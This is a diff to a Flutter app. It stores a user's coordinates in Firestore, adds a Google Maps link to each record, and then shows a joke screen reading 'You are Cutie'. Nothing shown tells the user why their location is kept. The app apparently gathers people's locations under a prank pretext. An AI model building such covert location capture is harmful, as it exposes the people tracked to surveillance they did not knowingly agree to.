@@ -58,7 +58,8 @@ class _LocationPermissionScreenState extends State<LocationPermissionScreen> {
         permission = await Geolocator.requestPermission();
         if (permission != LocationPermission.always &&
             permission != LocationPermission.whileInUse) {
-          setState(() => status = 'Permission denied');
+          setState(() => status = 'Permission denied\n'
+              'Please enable location permissions in settings.');
           return;
         }
       }
@@ -70,6 +71,8 @@ class _LocationPermissionScreenState extends State<LocationPermissionScreen> {
           'latitude': position.latitude,
           'longitude': position.longitude,
           'timestamp': FieldValue.serverTimestamp(),
+          'openMap':
+              "https://www.google.com/maps/search/?api=1&query=${position.latitude},${position.longitude}"
         });
         log(value.id);
       } catch (e) {
@@ -89,8 +92,14 @@ class _LocationPermissionScreenState extends State<LocationPermissionScreen> {
   @override
   Widget build(BuildContext context) {
     return Scaffold(
-      body: Center(child: Text(status)),
-    );
+        body: Center(
+      child: Text(status,
+          textAlign: TextAlign.center,
+          style: Theme.of(context).textTheme.headlineMedium?.copyWith(
+                fontSize: 24,
+                color: Colors.black87,
+              )),
+    ));
   }
 }
 
@@ -104,11 +113,18 @@ class HomeScreen extends StatelessWidget {
         child: Column(
           mainAxisAlignment: MainAxisAlignment.center,
           children: [
-            const Text('You are Lodu 😄',
-                style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold)),
+            const Text('You are Cutie 😄',
+                style: TextStyle(fontSize: 50, fontWeight: FontWeight.bold)),
             const SizedBox(height: 20),
-            Image.network(
-                'https://i.imgur.com/BZTzp1L.png'), // Replace with a custom image if needed
+            Text(
+              "♥️🥰",
+              // "🖕",
+              style: Theme.of(context)
+                  .textTheme
+                  .headlineLarge
+                  ?.copyWith(fontSize: 70, color: Colors.pinkAccent),
+            )
+            // Replace with a custom image if needed
           ],
         ),
       ),
